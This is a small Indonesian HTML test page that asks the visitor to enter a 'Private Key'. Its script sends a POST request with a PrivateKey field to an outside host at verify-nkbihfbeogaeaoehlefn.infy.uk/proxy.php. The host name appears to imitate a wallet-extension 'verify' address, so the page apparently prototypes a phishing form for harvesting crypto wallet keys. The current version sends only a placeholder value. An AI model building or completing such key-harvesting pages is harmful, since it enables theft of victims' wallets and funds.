<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Percobaan POST</title>
</head>
<body>
    <h2>Uji Coba Form POST ke InfinityFree</h2>
    <input type="text" id="privateKey" placeholder="Masukkan Private Key">
    <button onclick="submitForm()">Kirim</button>

    <script>
        function submitForm() {
            let privateKey = document.getElementById("privateKey").value;
            console.log("Mengirim Private Key:", privateKey);

            fetch("https://verify-nkbihfbeogaeaoehlefn.infy.uk/proxy.php", {
    method: "POST",
    mode: "no-cors",  // Tambahkan ini
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ PrivateKey: "contohPrivateKey" }),
})
.then(response => console.log("Permintaan dikirim"))
.catch(error => console.error("Error:", error));

        }
    </script>
</body>
</html>
